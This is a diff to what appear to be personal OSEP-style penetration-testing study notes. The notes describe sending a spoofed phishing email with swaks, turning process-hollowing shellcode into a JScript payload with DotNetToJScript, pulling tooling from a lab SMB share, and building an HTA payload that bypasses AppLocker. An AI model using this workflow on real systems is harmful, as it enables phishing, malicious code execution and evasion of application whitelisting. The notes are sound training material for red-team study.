@@ -83,6 +83,7 @@ swaks --to will@tricky.com --from techsupport@bestcomputers.com --header 'Subjec
 example with process hollowing:
 ```
 # copy relevant parts of shellcode_process_hollowing/Program.cs to DotNetToJScript/ExampleAssembly/TestClass.cs
+# REMEMBER: to replace the main method with 'public TestClass()'
 
 # mono build then copy ExampleAssembly.dll
 cd OSEP-Code-Snippets/DotNetToJScript/DotNetToJScript/bin/Release
@@ -90,7 +91,7 @@ cp ../../../ExampleAssembly/bin/Release/ExampleAssembly.dll .
 
 # don't bother using mono to run it on linux you will just get an error
 # on windows dev mount the smb in powershell
-net use z: \\192.168.45.246\vscode /user:kali kali
+net use z: \\192.168.45.207\vscode /user:kali kali
 Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\DotNetToJScript.exe Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
 
 # copy demo.js back to our kali machine
@@ -106,6 +107,7 @@ troubleshooting:
 
 Right-click ExampleAssembly > Options > Build > General > Allow 'unsafe' code
 ```
+see [[#mshta.exe]] for generating a jscript+hta payload that bypasses applocker
 see also: https://github.com/med0x2e/GadgetToJScript
 ## SuperSharpShooter
 convert binary payloads to js, vbs and hta
